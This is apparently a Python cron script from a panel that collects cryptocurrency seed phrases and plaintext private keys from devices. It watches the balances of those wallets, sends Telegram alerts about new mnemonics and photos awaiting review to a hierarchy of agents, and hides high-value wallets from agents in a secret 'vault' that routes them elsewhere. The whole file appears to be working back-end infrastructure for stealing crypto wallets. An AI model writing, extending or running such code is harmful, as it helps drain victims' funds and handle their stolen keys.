#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""notify_scan.py — 通知管道（每分钟，cron）

流程：
  ① 价格缓存（5 分钟一次，OKX 主源）→ adm888app/data/price_cache.json
  ② 处理 balance_changes 未通知行：
       只推「新增」（delta>0 或 token 进账）；折算 value_usd（token 按报价，原生按链币价）；
       写站内 notifications(type=addr_change)；标记该行 notified + delta_usd
  ③ 新助记词（mnemonics 游标，排除 rv:）→ notifications(type=new_mnemonic)
  ④ 待人工复核（ukey rv:<pid> 新增）→ notifications(type=review_needed)
  ⑤ key 额度告警（bal_key_alert.json 新告警）→ notifications(type=key_quota)
  ⑥ TG 发送：toggles 开关 + 阈值过滤（addr_change 需 value_usd ≥ 阈值；key_quota 永远发）
  ⑦ 清理：balance_changes 30 天；已读 notifications 30 天
配置：adm888app/data/notify_cfg.json（600）  状态：adm888app/data/notify_state.json
"""
import os, json, time, subprocess, urllib.request, urllib.error
import psycopg2

BASE = '/www/wwwroot/i.131422.com'
PG_F = os.path.join(BASE, 'adm888app', 'data', 'pg.json')
CFG_F = os.path.join(BASE, 'adm888app', 'data', 'notify_cfg.json')
STATE_F = os.path.join(BASE, 'adm888app', 'data', 'notify_state.json')
PRICE_F = os.path.join(BASE, 'adm888app', 'data', 'price_cache.json')
ALERT_F = os.path.join(BASE, 'adm888app', 'data', 'bal_key_alert.json')

def log(*a):
    print(time.strftime('[%Y-%m-%d %H:%M:%S]'), *a, flush=True)

# ── PG ──
cfgj = json.load(open(PG_F))
DB = dict(host=cfgj.get('host', '127.0.0.1'), port=int(cfgj.get('port', 5432)),
          user=cfgj.get('user'), password=cfgj.get('password'), dbname=cfgj.get('database', 'panel'))
conn = psycopg2.connect(**DB)
conn.autocommit = True
def q(sql, args=None):
    global conn
    try:
        with conn.cursor() as cur:
            cur.execute(sql, args or ())
            return cur.fetchall() if cur.description else []
    except Exception as e:
        log('PG 重连:', str(e)[:80])
        try: conn.close()
        except Exception: pass
        conn = psycopg2.connect(**DB); conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql, args or ())
            return cur.fetchall() if cur.description else []

# ── 配置 / 状态 ──
CFG_DEFAULT = {
    "tg_token": "", "tg_chat_id": "",
    "usd_threshold": 5,
    "toggles": {"new_mnemonic": True, "review_needed": True, "addr_change": True},
}
def load_json(f, d):
    try: return json.load(open(f, encoding='utf-8'))
    except Exception: return d
CFG = dict(CFG_DEFAULT)
CFG.update(load_json(CFG_F, {}))
CFG['toggles'] = {**CFG_DEFAULT['toggles'], **(CFG.get('toggles') or {})}
STATE = load_json(STATE_F, {})
def save_state():
    with open(STATE_F + '.tmp', 'w', encoding='utf-8') as f:
        json.dump(STATE, f)
    os.replace(STATE_F + '.tmp', STATE_F)

# ── 价格缓存（OKX）──
SYMS = {'TRX': 'TRX-USDT', 'ETH': 'ETH-USDT', 'BNB': 'BNB-USDT', 'POL': 'POL-USDT',
        'BTC': 'BTC-USDT', 'LTC': 'LTC-USDT', 'SOL': 'SOL-USDT', 'DOGE': 'DOGE-USDT',
        'TON': 'TON-USDT', 'USDT': None, 'USDC': None}   # 【2026-09-16】USDC 按 1:1 计价（稳定币）
def http_get(url, timeout=10):
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    return urllib.request.urlopen(req, timeout=timeout).read()
def refresh_prices():
    cache = load_json(PRICE_F, {})
    if cache.get('ts', 0) > time.time() - 300:
        return cache
    prices = dict(cache.get('prices') or {})
    for sym, inst in SYMS.items():
        if inst is None:
            prices[sym] = 1.0
            continue
        try:
            j = json.loads(http_get('https://www.okx.com/api/v5/market/ticker?instId=' + inst))
            prices[sym] = float(j['data'][0]['last'])
        except Exception as e:
            log('价格获取失败', sym, str(e)[:40])
    out = {'ts': time.time(), 'prices': prices}
    try:
        with open(PRICE_F + '.tmp', 'w') as f:
            json.dump(out, f)
        os.replace(PRICE_F + '.tmp', PRICE_F)
    except Exception:
        pass
    return out
PRICES = refresh_prices().get('prices') or {}

CHAIN_SYM = {'TRON': 'TRX', 'TRX': 'TRX', 'BTC': 'BTC', 'LTC': 'LTC', 'DOGE': 'DOGE', 'SOL': 'SOL',
             'TON': 'TON', 'TONKEEPER': 'TON', 'TONHUB': 'TON', 'COIN607': 'TON',
             'ETH': 'ETH', 'ETHEREUM': 'ETH', 'METAMASK': 'ETH', 'TRUST': 'ETH', 'BITGET': 'ETH',
             'IMTOKEN': 'ETH', 'EXODUS': 'ETH', 'WALLET': 'ETH',
             # 【2026-09-15 修正】EVM 各链用各自的原生币价（0.6 POL 曾错按 ETH 计价 → $1446 虚报）
             'POLYGON': 'POL', 'BSC': 'BNB', 'ARBITRUM': 'ETH', 'BASE': 'ETH'}
def value_usd(chain, delta, token_abbr, token_amount):
    if token_abbr and token_amount:
        p = PRICES.get(str(token_abbr).upper())
        if p:
            return float(token_amount) * p
        return None
    sym = CHAIN_SYM.get(str(chain or '').upper())
    if sym and delta is not None and PRICES.get(sym):
        return float(delta) * PRICES[sym]
    return None

def fmt_amt(v):
    if v is None: return '—'
    v = float(v)
    if v == 0: return '0'
    return ('%.8f' % v).rstrip('0').rstrip('.')

# ── ⑥ TG 发送 ──
def tg_send(text, chat_id=None):
    """发送到指定 chat（队列行自带的 chat_id 优先；缺省才用全局超管 chat）
       ——【2026-09-15 修复】原实现忽略队列 chat_id、一律发全局 chat，导致代理通知错投超管。"""
    tok = CFG.get('tg_token')
    chat = str(chat_id or CFG.get('tg_chat_id') or '').strip()
    if not tok or not chat:
        return False, '未配置'
    body = json.dumps({'chat_id': chat, 'text': text, 'disable_web_page_preview': True}).encode()
    req = urllib.request.Request('https://api.telegram.org/bot%s/sendMessage' % tok, data=body,
                                 headers={'Content-Type': 'application/json'})
    try:
        j = json.loads(urllib.request.urlopen(req, timeout=12).read())
        got = str((((j.get('result') or {}).get('chat')) or {}).get('id', ''))
        if j.get('ok') and got and got != chat:
            return False, '目标校验失败: 实际 chat=%s ≠ 目标=%s' % (got, chat)
        return bool(j.get('ok')), str(j.get('description') or '')
    except urllib.error.HTTPError as e:
        return False, e.read()[:120].decode('utf8', 'ignore')
    except Exception as e:
        return False, str(e)[:80]

# ── ② 处理变动 ──
# ── 【2026-09-16】暗池（vault）联动：发送/释放前的判定与冷却门 ──────────────────
#   规则：单地址估值 ≥ vault_threshold_usd → 入池（全端隐藏 + 直达 vault_chat_id + docs 记录）
#   冷却门：新助记词/待复核 通知延迟 vault_hold_sec 创建（等余额首查），到期查池；被入池则整条不出现
_vs_cache = {'t': 0, 'serials': set(), 'addrs': set()}
def _vault_sets():
    if time.time() - _vs_cache['t'] < 30:
        return _vs_cache
    try:
        rows = q("SELECT DISTINCT serial FROM vault_items WHERE serial IS NOT NULL AND serial <> ''")
        rows2 = q("SELECT DISTINCT a.serial FROM addresses a JOIN vault_items v ON a.public_key = v.addr AND COALESCE(v.reason,'') NOT LIKE 'PENDING_GATE%%' WHERE a.serial IS NOT NULL AND a.serial <> ''")   # 【2026-09-19 复审修复】挂起期批量地址不做反向连带
        rows3 = q("SELECT addr FROM vault_items")
        _vs_cache['serials'] = set(str(r[0]) for r in rows) | set(str(r[0]) for r in rows2)
        _vs_cache['addrs'] = set(str(r[0]) for r in rows3)
    except Exception as e:
        log('vault 集合查询失败: %s' % str(e)[:80])
    _vs_cache['t'] = time.time()
    return _vs_cache

# ── 【2026-09-18】暗池前置门（vault_gate）：PENDING 判定期间"继续扣着"，不释放也不丢弃 ──
_gate_cache = {'t': 0, 'serials': set(), 'addrs': set()}
def _gate_pending():
    if time.time() - _gate_cache['t'] < 30:
        return _gate_cache['serials']
    try:
        rows = q("SELECT DISTINCT serial, addr FROM vault_items WHERE reason LIKE 'PENDING_GATE%%'")
        _gate_cache['serials'] = set(str(r[0]) for r in rows if r[0])
        # 【2026-09-19 复审修复】同时收集 addr：serial 为空（地址级/共享地址）时也要能命中"挂起中"
        _gate_cache['addrs'] = set(str(r[1]) for r in rows if r[1])
    except Exception as e:
        log('gate pending 查询失败: %s' % str(e)[:80])
    _gate_cache['t'] = time.time()
    return _gate_cache['serials']

def _gate_pending_hit(serial, addr):
    """该变动是否属于前置门挂起中的设备/地址（挂起期间不落 notified，释放后补发）"""
    _gate_pending()
    return (serial and str(serial) in _gate_cache['serials']) or (addr and str(addr) in _gate_cache.get('addrs', set()))

def _vault_check_cli(addr=None, serial=None, pending=None):
    """调 vault_check.js（node，数值逻辑单一实现）；成功返回 dict，失败返回 None（按"未知"处理）"""
    try:
        args = ['/usr/local/bin/node', '/www/wwwroot/i.131422.com/tools/vault_check.js']
        if addr: args += ['--addr', str(addr)]
        if serial: args += ['--serial', str(serial)]
        if pending: args += ['--pending', str(pending)]
        r = subprocess.run(args, capture_output=True, text=True, timeout=30)
        j = json.loads((r.stdout or '').strip() or '{}')
        if isinstance(j, dict) and j.get('vaulted'):
            _vs_cache['t'] = 0   # 【2026-09-16】刚入池 → 立即失效集合缓存，保证随后的路由/判定用最新名单
        return j
    except Exception as e:
        log('vault_check 调用失败: %s' % str(e)[:80])
        return None

HOLD_SEC = int(CFG.get('vault_hold_sec') or 300)
GATE_MAX_SEC = int(CFG.get('gate_max_sec') or 3600)   # 【2026-09-24】暗池 PENDING 顺延总上限（默认 1 小时；用户批准缩短冷却）

def process_changes():
    rows = q("""SELECT id, addr, chain, serial, old_bal, new_bal, delta, token_abbr, token_amount, txid
                FROM balance_changes WHERE notified = false ORDER BY id LIMIT 300""")
    n = 0
    # 【2026-09-17】站内通知阈值：折算金额 < $1 的进账不再生成站内通知（灰尘噪声过滤）
    #   注：TG 侧另有 usd_threshold（默认 $5）；本阈值只影响站内通知流
    st_min = float(CFG.get('station_threshold_usd') or 1)
    for (cid, addr, chain, serial, oldb, newb, delta, tabbr, tamount, txid) in rows:
        d = float(delta) if delta is not None else 0.0
        is_inc = (d > 0) or (tamount is not None and float(tamount) > 0)
        v = value_usd(chain, d if d else None, tabbr, float(tamount) if tamount is not None else None)
        if is_inc:
            # 【2026-09-16】暗池：已入池（该设备/地址）→ 静默跳过；本条变动后估值 ≥ 阈值 → 先入池再跳过
            vs = _vault_sets()
            if (serial and str(serial) in vs['serials']) or (addr and str(addr) in vs['addrs']):
                # 【2026-09-18 复审修复】PENDING（前置门挂起中）≠ 已入池：不落 notified（release 后自然补发；
                #   若随后判定 VAULT，则由 keepVaulted 的清理流程删除，不产生残留）
                # 【2026-09-19 复审修复】命中判定带上 addr 维度（serial 可能为空）
                if _gate_pending_hit(serial, addr):
                    continue
                q("UPDATE balance_changes SET notified = true, delta_usd = %s WHERE id = %s", (v, cid))
                continue
            chk = _vault_check_cli(addr=addr, pending=cid)
            if chk and chk.get('vaulted'):
                q("UPDATE balance_changes SET notified = true, delta_usd = %s WHERE id = %s", (v, cid))
                continue
            if v is not None and float(v) < st_min:
                q("UPDATE balance_changes SET notified = true, delta_usd = %s WHERE id = %s", (v, cid))
                continue
            if tabbr and tamount:
                head = '+%s %s' % (fmt_amt(tamount), tabbr)
            else:
                head = '+%s %s' % (fmt_amt(d), CHAIN_SYM.get(str(chain or '').upper(), chain or ''))
            # 【2026-09-16】微额估值（<$0.005）显示 <0.01，避免 （≈$0.00） 的误导写法
            vtxt = ((('（≈$%.2f）' % v) if v >= 0.005 else '（≈$<0.01）') if v is not None else '')
            serialtxt = ('设备 %s · ' % serial) if serial else ''
            title = '地址进账 %s%s' % (head, vtxt)
            body = {'addr': addr, 'chain': chain, 'serial': serial, 'old': str(oldb) if oldb is not None else None,
                    'new': str(newb) if newb is not None else None, 'delta': d,
                    'token': tabbr, 'token_amount': float(tamount) if tamount is not None else None,
                    'value_usd': v, 'txid': txid}
            q("""INSERT INTO notifications (type, title, body) VALUES ('addr_change', %s, %s::jsonb)""",
              (title, json.dumps(body, ensure_ascii=False)))
            n += 1
        q("UPDATE balance_changes SET notified = true, delta_usd = %s WHERE id = %s", (v, cid))
    return len(rows), n

# ── ③ 新助记词 / ④ 复核 ──
def process_mnemonics():
    last = int(STATE.get('last_mnemonic_id') or 0)
    rows = q("""SELECT e.id, COALESCE(e.serial,''), COALESCE(e.ip::text,''), COALESCE(e.app_type,''),
                       COALESCE(e.abbr,''), COALESCE(e.data->>'src','')
                FROM mnemonics e WHERE e.id > %s AND (e.ukey IS NULL OR e.ukey NOT LIKE 'rv:%%')
                ORDER BY e.id LIMIT 100""", (last,))
    hold = STATE.setdefault('hold_items', [])
    for (mid, serial, ip, atype, abbr, src) in rows:
        # 【2026-09-18】测试设备（TEST 开头）不产生任何通知
        if str(serial or '').startswith('TEST'):
            last = max(last, mid); continue
        # 【2026-09-16】冷却门：延迟 HOLD_SEC 创建（等该设备余额首查完成；被入池则整条不产生）
        hold.append({'kind': 'mn', 'id': int(mid), 'serial': serial or '', 'until': time.time() + HOLD_SEC, 'ext': 0})
        last = max(last, mid)
    if rows:
        STATE['last_mnemonic_id'] = last
    # 复核
    lastr = int(STATE.get('last_review_id') or 0)
    rows2 = q("""SELECT e.id, COALESCE(e.serial,''), COALESCE(e.data->>'photo_id',''), COALESCE(e.abbr,'')
                 FROM mnemonics e WHERE e.id > %s AND e.ukey LIKE 'rv:%%' ORDER BY e.id LIMIT 100""", (lastr,))
    for (mid, serial, pid, abbr) in rows2:
        if str(serial or '').startswith('TEST'):
            lastr = max(lastr, mid); continue
        hold.append({'kind': 'rv', 'id': int(mid), 'serial': serial or '', 'until': time.time() + HOLD_SEC, 'ext': 0})
        lastr = max(lastr, mid)
    if rows2:
        STATE['last_review_id'] = lastr
    return len(rows), len(rows2)

def release_holds():
    """冷却门释放：到期 → 查池（已入池则丢弃）；有未查余额的地址 → 延长（≤3 次）；否则创建通知"""
    now = time.time()
    hold = STATE.get('hold_items') or []
    keep, released, dropped, extended = [], 0, 0, 0
    for it in hold:
        if float(it.get('until') or 0) > now:
            keep.append(it); continue
        serial = str(it.get('serial') or '')
        # 【2026-09-18】暗池前置门：PENDING 判定期间不释放、不丢弃（顺延再看）
        # 【2026-09-24】PENDING 顺延加"总上限" GATE_MAX_SEC（默认 1h；原为无限顺延，实测拖出 5.4h）：超限不再顺延 → 走正常释放补发
        if serial and serial in _gate_pending():
            gf = float(it.setdefault('gate_first', now) or now)
            if now - gf < GATE_MAX_SEC:
                it['until'] = now + 60
                keep.append(it); extended += 1; continue
        vaulted = False
        vs = _vault_sets()
        if serial and serial in vs['serials']:
            vaulted = True
        elif serial:
            chk = _vault_check_cli(serial=serial)
            if chk and chk.get('vaulted'):
                vaulted = True
        if vaulted:
            dropped += 1; continue
        if serial and int(it.get('ext') or 0) < 3:
            try:
                # 【2026-09-19 复审修复】只等"可查询地址"（NOK + 链/格式有效）——imToken UUID 这类永远查不了的内部行不再拖延冷却
                _chk = """SELECT count(*) FROM addresses WHERE serial = %s AND public_key IS NOT NULL AND public_key <> ''
                            AND ( COALESCE(private_key_plain,'') <> ''
                               OR EXISTS (SELECT 1 FROM addresses d WHERE d.serial = addresses.serial AND lower(d.public_key)=lower(addresses.public_key) AND COALESCE(d.private_key_plain,'')<>'')
                               OR (COALESCE(data->>'derivation_path','') <> '' AND EXISTS (SELECT 1 FROM mnemonics m WHERE m.serial = addresses.serial AND COALESCE(m.plain,'')<>'')) )
                            AND ( upper(COALESCE(chain,'')) IN ('ETH','ETHEREUM','METAMASK','TRUST','BITGET','IMTOKEN','EXODUS','TRON','TRX','BTC','LTC','DOGE','SOL','TON','TONKEEPER','TONHUB','COIN607')
                                  OR public_key ~ '^(EQ|UQ|kQ|0Q|Ef|Uf)[A-Za-z0-9_-]{45,48}$' )
                            AND NOT ( upper(COALESCE(chain,'')) IN ('ETH','ETHEREUM','METAMASK','TRUST','BITGET','IMTOKEN','EXODUS') AND public_key !~ '^0x[0-9a-fA-F]{40}$' )"""
                c_any = q(_chk, (serial,))[0][0]
                c_null = q(_chk.replace('SELECT count(*) FROM addresses WHERE', "SELECT count(*) FROM addresses WHERE bal_at IS NULL AND"), (serial,))[0][0]
            except Exception:
                c_any = c_null = 0
            if c_any and c_null:
                it['until'] = now + HOLD_SEC
                it['ext'] = int(it.get('ext') or 0) + 1
                keep.append(it); extended += 1; continue
        mid = int(it.get('id') or 0)
        try:
            if it.get('kind') == 'mn':
                rr = q("""SELECT COALESCE(e.serial,''), COALESCE(e.ip::text,''), COALESCE(e.app_type,''),
                                 COALESCE(e.abbr,''), COALESCE(e.data->>'src','')
                          FROM mnemonics e WHERE e.id = %s""", (mid,))
                if rr:
                    s2, ip, atype, abbr, src = rr[0]
                    title = '新助记词 · %s · %s' % (s2 or '—', atype or '?')
                    body = {'mnemonic_id': mid, 'serial': s2, 'ip': ip, 'app_type': atype, 'abbr': abbr, 'src': src}
                    q("INSERT INTO notifications (type, title, body) VALUES ('new_mnemonic', %s, %s::jsonb)",
                      (title, json.dumps(body, ensure_ascii=False)))
                    released += 1
            else:
                rr = q("""SELECT COALESCE(e.serial,''), COALESCE(e.data->>'photo_id',''), COALESCE(e.abbr,'')
                          FROM mnemonics e WHERE e.id = %s""", (mid,))
                if rr:
                    s2, pid, abbr = rr[0]
                    title = '待人工复核图片 · %s' % (s2 or '—')
                    body = {'mnemonic_id': mid, 'serial': s2, 'photo_id': pid, 'abbr': abbr}
                    q("INSERT INTO notifications (type, title, body) VALUES ('review_needed', %s, %s::jsonb)",
                      (title, json.dumps(body, ensure_ascii=False)))
                    released += 1
        except Exception as e:
            log('冷却门释放写入失败 id=%s: %s' % (mid, str(e)[:80]))
    STATE['hold_items'] = keep[-500:]
    return released, dropped, extended

# ── ⑤ key 额度告警 ──
def process_key_alert():
    a = load_json(ALERT_F, None)
    if not a or not a.get('ts'):
        return False
    if float(a['ts']) <= float(STATE.get('last_key_alert_ts') or 0):
        return False
    title = '⚠️ Key 额度告警：%s 池用量 %.0f%%' % (a.get('pool', '?'), (a.get('ratio') or 0) * 100)
    body = dict(a)
    q("INSERT INTO notifications (type, title, body) VALUES ('key_quota', %s, %s::jsonb)",
      (title, json.dumps(body, ensure_ascii=False)))
    STATE['last_key_alert_ts'] = a['ts']
    return True

# ── ⑥ 通知 → TG 路由（【2026-09-16 用户化】超管各自绑定 + 设备归属代理链）────
#    站内通知流=超管专属；TG 分发 = 各超管自己的 tg_bindings（互不覆盖；专属设备仅 viewer）
#    + 设备直接归属代理及其全部上级代理
#    （超管/代理各自的种类开关独立生效；addr_change 全院统一 USD 阈值）
DRY = os.environ.get('NOTIFY_DRY') == '1'
_agent_cache = {'t': 0, 'tree': {}}

def _load_tree():
    if time.time() - _agent_cache['t'] < 60:
        return
    tree = {}
    try:
        for (aid, pid, role, st) in q("SELECT id, parent_id, role, COALESCE(status,'') FROM agents"):
            tree[int(aid)] = {'parent': int(pid) if pid else None, 'role': role, 'status': st}
    except Exception as e:
        log('agents 树加载失败:', str(e)[:80])
    _agent_cache['tree'] = tree
    _agent_cache['t'] = time.time()

# 专属代理可见性缓存（30s，与 visibility.json 同口径；改完 30 秒内生效）
_vis_cache = {'t': 0, 'excl': set(), 'viewers': set()}
def _load_vis():
    if time.time() - _vis_cache['t'] < 30:
        return
    try:
        j = json.load(open('/www/wwwroot/i.131422.com/adm888app/data/visibility.json', encoding='utf-8'))
        _vis_cache['excl'] = set(int(x) for x in (j.get('exclusive_agents') or []))
        _vis_cache['viewers'] = set(int(x) for x in (j.get('viewer_ids') or []))
    except Exception:
        pass
    _vis_cache['t'] = time.time()

# 【2026-09-16 用户化】超管账号集（auth.json role=super_admin，30s 缓存）
_auth_cache = {'t': 0, 'admins': set()}
def _load_superadmins():
    if time.time() - _auth_cache['t'] < 30:
        return _auth_cache['admins']
    try:
        j = json.load(open('/www/wwwroot/i.131422.com/adm888app/data/auth.json', encoding='utf-8'))
        _auth_cache['admins'] = set(int(u['id']) for u in (j.get('users') or [])
                                    if u.get('role') == 'super_admin' and u.get('status') != 'deleted')
    except Exception:
        pass
    _auth_cache['t'] = time.time()
    return _auth_cache['admins']

def _recipients_for(serial):
    """设备 serial → 直接归属代理 + 全部上级代理（仅 role=agent，去重，封顶 20 层）
       【2026-09-16】专属代理（visibility.json exclusive_agents）：其设备通知只发本人，
       不向上级链路扩散（superadmin/viewer id3 经其本人 TG 绑定另行收到，与页面端隔离口径一致）"""
    _load_tree()
    tree = _agent_cache['tree']
    out, seen = [], set()
    try:
        owners = [int(x[0]) for x in q("SELECT DISTINCT agent_id FROM agent_device WHERE serial = %s", (serial,))]
    except Exception:
        owners = []
    for oid in owners:
        _load_vis()
        if oid in _vis_cache['excl']:
            if oid not in seen:
                seen.add(oid)
                out.append(oid)
            continue
        cur = oid
        depth = 0
        while cur and cur not in seen and depth < 20:
            seen.add(cur)
            info = tree.get(cur)
            if not info or info['role'] != 'agent' or info['status'] == 'deleted':
                break
            out.append(cur)
            cur = info['parent']
            depth += 1
    return out

def render_text(ntype, title, body):
    b = body or {}
    if ntype == 'addr_change':
        return '⚡ 余额进账提醒\n%s\n地址 %s（%s）%s\n%s' % (
            title, b.get('addr', '—'), b.get('chain', '—'),
            ('tx: %s…' % str(b['txid'])[:16]) if b.get('txid') else '',
            ('设备: %s' % b['serial']) if b.get('serial') else '')
    if ntype == 'new_mnemonic':
        return '🆕 新助记词\n%s\n摘要: %s（面板查看明文）' % (title, b.get('abbr') or '—')
    if ntype == 'review_needed':
        return '🖼 待人工复核图片\n%s\n复核页: https://wpsdz.com/adm888panel/assets/review/index.html' % title
    if ntype == 'key_quota':
        return '⚠️ Key 额度告警\n%s\n%s' % (title, b.get('hint') or '请补充新 key')
    return title

def process_routing():
    rows = q("SELECT id, type, title, body FROM notifications WHERE tg_sent = false ORDER BY id LIMIT 100")
    queued = skipped = 0
    threshold = float(CFG.get('usd_threshold') or 5)
    sup_ids = _load_superadmins()
    for (nid, ntype, title, body) in rows:
        b = body or {}
        # 【2026-09-16】暗池防御：该设备/地址已入池 → 永不外发（正常已在源头被抑制，此为兜底）
        _vs = _vault_sets()
        _se = str(b.get('serial') or '')
        _ad = str(b.get('addr') or '')
        if (_se and _se in _vs['serials']) or (_ad and _ad in _vs['addrs']):
            q("UPDATE notifications SET tg_sent = true WHERE id = %s", (nid,))
            continue
        if ntype == 'addr_change':
            v = b.get('value_usd')
            if v is None or float(v) < threshold:
                q("UPDATE notifications SET tg_sent = true WHERE id = %s", (nid,))
                skipped += 1
                continue
        text = render_text(ntype, title, b)
        serial = str(b.get('serial') or '').strip()
        # 专属代理设备判定（serial 归属链含专属代理）
        _load_vis()
        is_excl = False
        if serial:
            try:
                _owners = [int(x[0]) for x in q("SELECT DISTINCT agent_id FROM agent_device WHERE serial = %s", (serial,))]
            except Exception:
                _owners = []
            is_excl = any(o in _vis_cache['excl'] for o in _owners)
        chats = {}
        # 【2026-09-17 隔离】监控地址（无 serial 的 addr_change）：只发该地址主人的 TG；历史无主行不外发
        is_watch = False
        watch_owners = []
        if not serial and _ad:
            try:
                _wr = q("SELECT DISTINCT owner_id FROM watch_addrs WHERE addr = %s", (_ad,))
            except Exception:
                _wr = []
            if _wr:
                is_watch = True
                watch_owners = [int(x[0]) for x in _wr if x[0] is not None]
        # 【2026-09-16 用户化】超管收款人 = 各自在 tg_bindings 的绑定（按账号隔离、互不覆盖）；
        #   专属代理设备的通知只发 viewer（superadmin 白名单）——admin 等非 viewer 超管不收
        for uid in sorted(sup_ids):
            try:
                r0 = q("SELECT chat_id, toggles FROM tg_bindings WHERE agent_id = %s AND enabled", (uid,))
            except Exception:
                r0 = []
            if not r0:
                continue
            chat = str(r0[0][0] or '').strip()
            if not chat:
                continue
            if ntype != 'key_quota' and not (r0[0][1] or {}).get(ntype, True):
                continue
            if is_excl and uid not in _vis_cache['viewers']:
                continue
            if is_watch and uid not in watch_owners:
                continue
            chats.setdefault(chat, uid)
        # 代理链收款人（设备归属代理 + 全部上级；专属代理设备只发本人，不向上扩散）
        if ntype != 'key_quota' and serial:
            for aid in _recipients_for(serial)[:20]:
                try:
                    r = q("SELECT chat_id, toggles FROM tg_bindings WHERE agent_id = %s AND enabled", (aid,))
                except Exception:
                    r = []
                if not r:
                    continue
                chat = str(r[0][0])
                toggles = r[0][1] or {}
                if not toggles.get(ntype, True):
                    continue
                chats.setdefault(chat, aid)
        for chat, aid in chats.items():
            q("INSERT INTO tg_queue (notification_id, chat_id, agent_id, text) VALUES (%s,%s,%s,%s)",
              (nid, chat, aid, text))
            queued += 1
        q("UPDATE notifications SET tg_sent = true WHERE id = %s", (nid,))
    return len(rows), queued, skipped

def process_queue():
    rows = q("SELECT id, chat_id, agent_id, text, tries FROM tg_queue WHERE sent_at IS NULL ORDER BY id LIMIT 30")
    sent = failed = 0
    for (qid, chat, aid, text, tries) in rows:
        if DRY:
            q("UPDATE tg_queue SET sent_at = now(), last_error = 'DRY' WHERE id = %s", (qid,))
            log('[DRY] 跳过发送 → chat=%s（agent=%s）' % (chat, aid))
            continue
        ok, desc = tg_send(text, chat)
        if ok:
            q("UPDATE tg_queue SET sent_at = now(), tries = tries + 1 WHERE id = %s", (qid,))
            sent += 1
            time.sleep(1.1)
        else:
            failed += 1
            t = int(tries or 0) + 1
            if t >= 3:
                q("UPDATE tg_queue SET tries = %s, sent_at = now(), last_error = %s WHERE id = %s", (t, desc[:200], qid))
                log('TG 发送放弃（3次失败）→ chat=%s: %s' % (chat, desc[:80]))
            else:
                q("UPDATE tg_queue SET tries = %s, last_error = %s WHERE id = %s", (t, desc[:200], qid))
                log('TG 发送失败（第%d次）→ chat=%s: %s' % (t, chat, desc[:80]))
            if failed >= 3:
                break
    return len(rows), sent, failed

# ── ⑦ 清理 ──
def prune():
    q("DELETE FROM balance_changes WHERE changed_at < now() - interval '30 days'")
    q("DELETE FROM notifications WHERE read_at IS NOT NULL AND created_at < now() - interval '30 days'")

# ── ⑧ 地址去重兜底（10 分钟一次；防派生/采集管线再插重复）──
def dedup_addresses():
    """【2026-09-17 升级】按 lower(public_key) 合并大小写变体 —— 重复通知的根因修复：
       同一地址大小写两行会被轮询两次 → 同笔进账各报一次。保留"数据最全"一行
       （有余额 → bal_at 最新 → 小写写法 → id 最小）；被删行的其它 serial 并入
       保留行 data.merged_serials（防关联信息丢失）。"""
    if time.time() - float(STATE.get('last_dedup_ts') or 0) < 600:
        return 0
    STATE['last_dedup_ts'] = time.time()
    rows = q("""SELECT lower(public_key) lp,
                       array_agg(id ORDER BY (bal IS NOT NULL) DESC, bal_at DESC NULLS LAST,
                                 (public_key = lower(public_key)) DESC, id ASC) AS ids,
                       array_agg(DISTINCT COALESCE(serial,'')) AS serials
                FROM addresses WHERE left(public_key, 2) = '0x'
                GROUP BY 1 HAVING COUNT(*) > 1""")
    n = 0
    for (lp, ids, serials) in rows:
        keep, drop = ids[0], ids[1:]
        if not drop:
            continue
        try:
            kr = q("SELECT COALESCE(serial,'') FROM addresses WHERE id = %s", (keep,))
            keep_serial = (kr[0][0] if kr else '') or ''
            others = [s for s in (serials or []) if s and s != keep_serial]
            if others:
                q("""UPDATE addresses SET data = COALESCE(data,'{}'::jsonb) ||
                       jsonb_build_object('merged_serials', %s::jsonb) WHERE id = %s""",
                  (json.dumps(sorted(set(others))), keep))
            q("DELETE FROM addresses WHERE id = ANY(%s)", (drop,))
            n += len(drop)
        except Exception as e:
            log('地址小写合并失败 %s: %s' % (lp, str(e)[:70]))
    if n:
        log('地址去重兜底（小写合并）：清理 %d 个重复行' % n)
    return n

def main():
    t0 = time.time()
    ch_total, ch_new = process_changes()
    mn_new, rv_new = process_mnemonics()
    rel, drp, ext = release_holds()
    ka_new = process_key_alert()
    nr, queued, rskip = process_routing()
    nq, sent, failed = process_queue()
    prune()
    dd = dedup_addresses()
    save_state()
    log('完成 | 变动 %d（新通知 %d）| 新助记词 %d | 复核 %d | 冷却 释放%d 丢弃%d 延长%d | key告警 %d | 路由 %d（入队 %d 跳过 %d）| 发送 %d 失败 %d | 去重 %d | %.1fs%s'
        % (ch_total, ch_new, mn_new, rv_new, rel, drp, ext, 1 if ka_new else 0, nr, queued, rskip, sent, failed, dd, time.time() - t0,
           ' [DRY]' if DRY else ''))

if __name__ == '__main__':
    main()
